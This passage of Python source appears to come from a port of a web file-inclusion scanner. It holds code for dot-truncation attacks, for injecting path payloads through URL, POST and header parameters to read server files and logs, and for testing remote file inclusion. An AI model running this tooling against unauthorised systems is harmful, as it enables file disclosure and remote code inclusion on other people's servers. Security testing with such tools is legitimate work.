        # ponytail: use set_seq1/set_seq2, set_seqs() removed in Python 3

        for i in range(dot_trunc_start, dot_trunc_end, dot_trunc_step):
            tmpurl = desturl
            tmppost = post_hax
            tmphead = deepcopy(header_dict)

            dots = "." * i
            if hax_mode == 0:
                tmpurl = tmpurl.replace(vuln_param_block, "%s%s" % (vuln_param_block, dots))
            elif hax_mode == 1:
                tmppost = tmppost.replace(vuln_param_block, "%s%s" % (vuln_param_block, dots))
            elif hax_mode == 2:
                tmp = tmphead.get(header_key or "", "")
                if isinstance(tmp, str):
                    tmp = tmp.replace(vuln_param_block, "%s%s" % (vuln_param_block, dots))
                tmphead[header_key or ""] = tmp

            async with self.semaphore:
                if tmppost:
                    content, _ = await self.http.post(tmpurl, tmppost, additional_headers=tmphead)
                else:
                    content, _ = await self.http.get(tmpurl, additional_headers=tmphead)

            if content is None:
                self.log.log("Dot Truncation testing failed :(", LOG_WARN)
                break

            seqmatcher.set_seq1(code1)
            seqmatcher.set_seq2(content)
            ratio = seqmatcher.ratio()
            if 1 - max_diff <= ratio <= 1:
                self.log.log("Dot Truncation successfull with: %d dots ; %f ratio!" % (i, ratio), LOG_INFO)
                r.setSurfix(dots)
                r.setSuffixBreakable(True)
                r.setSuffixBreakTechName("Dot-Truncation")
                return
            else:
                self.log.log("No luck with (%s)..." % i, LOG_DEBUG)

        self.log.log("Dot Truncation not possible :(", LOG_INFO)

    #=== read_files — test all file categories ==================================

    async def read_files(self, rep: VulnReport) -> list[str]:
        lang_class = None
        if rep.isLanguageSet():
            lang_class = self.lang.getAllLangSets().get(rep.getLanguage())

        if lang_class is None:
            if self.config.p_autolang:
                self.log.log("Unknown language - Autodetecting...", LOG_WARN)
                if rep.autoDetectLanguageByExtention(self.lang.getAllLangSets()):
                    self.log.log("Autodetect thinks this could be a %s-Script..." % rep.getLanguage(), LOG_INFO)
                    lang_class = self.lang.getAllLangSets().get(rep.getLanguage())
                else:
                    self.log.log("Autodetect failed!", LOG_ERROR)
                    return []
            else:
                self.log.log("Unknown language! Cannot guess.", LOG_WARN)
                return []

        if lang_class is None:
            return []

        files = self.lang.getRelativeFiles(rep.getLanguage())
        abs_files = self.lang.getAbsoluteFiles(rep.getLanguage())
        rmt_files = self.lang.getRemoteFiles(rep.getLanguage())
        log_files = self.lang.getLogFiles(rep.getLanguage())
        rfi_mode = self.config.rfi.mode if hasattr(self.config, 'rfi') else "off"

        ret: list[str] = []

        self.log.log("Testing default files...", LOG_DEBUG)
        for fileobj in files:
            post = fileobj.getPostData()
            p = fileobj.getFindStr()
            f = fileobj.getFilepath()
            flags = fileobj.getFlags()
            quiz = answer = ""
            if post:
                quiz, answer = lang_class.generateQuiz()
                post = post.replace("__QUIZ__", quiz)
                p = p.replace("__ANSWER__", answer)

            if rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()):
                if (rep.isUnix() and fileobj.isUnix()) or (rep.isWindows() and fileobj.isWindows()):
                    if await self.read_file(rep, f, p, POST=post if post else None):
                        ret.append(f)
                else:
                    self.log.log("Skipping file '%s' because it's not suitable for our OS." % f, LOG_DEBUG)
            else:
                self.log.log("Skipping file '%s'." % f, LOG_INFO)

        self.log.log("Testing absolute files...", LOG_DEBUG)
        for fileobj in abs_files:
            post = fileobj.getPostData()
            p = fileobj.getFindStr()
            f = fileobj.getFilepath()
            quiz = answer = ""
            if post:
                quiz, answer = lang_class.generateQuiz()
                post = post.replace("__QUIZ__", quiz)
                p = p.replace("__ANSWER__", answer)

            if rep.getPrefix() == "" and (rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()) or fileobj.isBreakable()):
                if fileobj.isBreakable():
                    rep.setSurfix("&")
                if (rep.isUnix() and fileobj.isUnix()) or (rep.isWindows() and fileobj.isWindows()):
                    if await self.read_file(rep, f, p, isAbs=True, POST=post if post else None):
                        ret.append(f)
            else:
                self.log.log("Skipping absolute file '%s'." % f, LOG_INFO)

        self.log.log("Testing log files...", LOG_DEBUG)
        for fileobj in log_files:
            p = fileobj.getFindStr()
            f = fileobj.getFilepath()
            if rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()):
                if (rep.isUnix() and fileobj.isUnix()) or (rep.isWindows() and fileobj.isWindows()):
                    if await self.read_file(rep, f, p):
                        ret.append(f)
            else:
                self.log.log("Skipping log file '%s'." % f, LOG_INFO)

        # Dynamic RFI
        if rfi_mode in ("ftp", "local"):
            self.log.log("Testing remote inclusion dynamicly...", LOG_INFO)
            if rep.getPrefix() == "":
                quiz, answer = lang_class.generateQuiz()
                up: dict = {}
                if rfi_mode == "ftp":
                    # ponytail: FTP upload not fully ported yet — stub for phase 2
                    up["http"] = self.config.rfi.ftp_http_map or ""
                    up["dirstruct"] = False
                    up["ftp"] = ""
                elif rfi_mode == "local":
                    up["http"] = self.config.rfi.local_http_map or ""
                    up["local"] = self.config.rfi.local_path or ""

                if up.get("http"):
                    if await self.read_file(rep, up["http"], answer, isAbs=True):
                        ret.append(up["http"])
                        rep.setRemoteInjectable(True)
        else:
            self.log.log("Testing remote inclusion...", LOG_DEBUG)
            for fileobj in rmt_files:
                p = fileobj.getFindStr()
                f = fileobj.getFilepath()
                canbreak = fileobj.isBreakable()

                if rep.getPrefix() == "" and (rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()) or canbreak):
                    if (not rep.isSuffixBreakable() and rep.getSurfix() != "") and f.endswith(rep.getSurfix()):
                        f = f[: -len(rep.getSurfix())]
                        rep.setSurfix("")
                    elif canbreak:
                        rep.setSurfix("&")
                    if (rep.isUnix() and fileobj.isUnix()) or (rep.isWindows() and fileobj.isWindows()):
                        if await self.read_file(rep, f, p, isAbs=True):
                            ret.append(f)
                            rep.setRemoteInjectable(True)
                else:
                    self.log.log("Skipping remote file '%s'." % f, LOG_INFO)

        return ret

    #=== read_file — single file test ===========================================

    async def read_file(
        self,
        report: VulnReport,
        filepath: str,
        filepattern: str,
        isAbs: bool = False,
        POST: Optional[str] = None,
        HEADER: Optional[dict] = None,
    ) -> bool:
        self.log.log("Testing file '%s'..." % filepath, LOG_INFO)

        lang_class = self.lang.getAllLangSets().get(report.getLanguage())
        if lang_class is None:
            return False

        tmpurl = report.getURL()
        prefix = report.getPrefix() or ""
        surfix = report.getSurfix()
        vuln = report.getVulnKey()
        params = report.getParams()

        postdata = report.getPostData()
        header = deepcopy(report.getHeader()) if report.getHeader() else {}
        vuln_header = report.getVulnHeader()
        hax_mode = report.isPost

        if prefix.endswith("/"):
            prefix = prefix[:-1]
            report.setPrefix(prefix)

        if filepath.startswith("/"):
            filepatha = prefix + filepath
        elif report.isWindows() and prefix.strip() and not isAbs:
            filepatha = prefix + filepath[3:]
        elif prefix.strip() and not isAbs:
            filepatha = prefix + "/" + filepath
        else:
            filepatha = filepath

        scriptpath = report.getServerPath() or ""
        if not scriptpath.endswith("/") and not filepatha.startswith("/") and not isAbs and report.isUnix():
            filepatha = "/" + filepatha

        payload = "%s%s" % (filepatha, surfix)
        if payload.endswith(report.getAppendix() or ""):
            payload = payload[: len(payload) - len(report.getAppendix() or "")]

        if hax_mode == 0:
            tmpurl = tmpurl.replace("%s=%s" % (vuln, params.get(vuln, "")), "%s=%s" % (vuln, payload))
        elif hax_mode == 1:
            postdata = (postdata or "").replace("%s=%s" % (vuln, params.get(vuln, "")), "%s=%s" % (vuln, payload))
        elif hax_mode == 2:
            tmphead = header.get(vuln_header or "", "")
            orig_param = ""
            if vuln_header and vuln_header in params and isinstance(params[vuln_header], dict):
                orig_param = params[vuln_header].get(vuln or "", "")
            if isinstance(tmphead, str):
                tmphead = tmphead.replace("%s=%s" % (vuln, orig_param), "%s=%s" % (vuln, payload))
            header[vuln_header or ""] = tmphead

        self.log.log("Testing URL: " + tmpurl, LOG_DEBUG)

        re_success = re.compile(lang_class.getSniper() % filepath, re.DOTALL)

        code: Optional[str] = None
        async with self.semaphore:
            if POST or postdata:
                final_post = ""
                if postdata:
                    final_post = postdata
                if POST:
                    final_post = "%s&%s" % (final_post, POST) if final_post else POST
                code, _ = await self.http.post(tmpurl, final_post, additional_headers=header)
            else:
                code, _ = await self.http.get(tmpurl, additional_headers=header)

        if code is None:
            return False

        m = re_success.search(code)
        if m is None:
            if filepattern is None or code.find(filepattern) != -1:
                return True

        return False

    #=== Helpers ================================================================

    def _get_random_str(self) -> str:
        import string as _string
        import random as _random
        chars = _string.ascii_letters + _string.digits
        return _random.choice(_string.ascii_letters) + "".join(
            _random.choice(chars) for _ in range(7)
        )

    async def _random_str_async(self) -> str:
        """Same as _get_random_str but async-safe wrapper."""
        return self._get_random_str()

    @staticmethod
    def _relpath_unix(path: str, start: str = ".") -> str:
        import posixpath
        if not path:
            raise ValueError("no path specified")
        start_list = posixpath.abspath(start).split("/")
        path_list = posixpath.abspath(path).split("/")
        return FileInclusionScanner._relpath_common(start_list, path_list, posixpath, ".")

    @staticmethod
    def _relpath_win(rootdir: Optional[str], path: str) -> str:
        import ntpath
        if not path:
            raise ValueError("no path specified")
        if rootdir is None:
            sep = "\\"
            start_list = ntpath.abspath(".").split(sep)
            path_list = ntpath.abspath(path).split(sep)
            return FileInclusionScanner._relpath_common(start_list, path_list, ntpath, "..")
        else:
            return FileInclusionScanner._relpath_unix(rootdir, path)

    @staticmethod
    def _relpath_common(start_list, path_list, mod, default_ret="."):
        # ponytail: common prefix, then ".." * diff + rest
        i = len(_commonprefix([start_list, path_list]))
        rel_list = [".."] * (len(start_list) - i) + path_list[i:]
        if not rel_list:
            return default_ret
        return mod.join(*rel_list)


def _commonprefix(m):
    """Longest common leading component of path lists. Ported from Python 2.6 source."""
    if not m:
        return []
    s1 = min(m, key=lambda x: "/".join(x))
    s2 = max(m, key=lambda x: "/".join(x))
    for i, (c1, c2) in enumerate(zip(s1, s2)):
        if c1 != c2:
            return s1[:i]
    return s1[:]
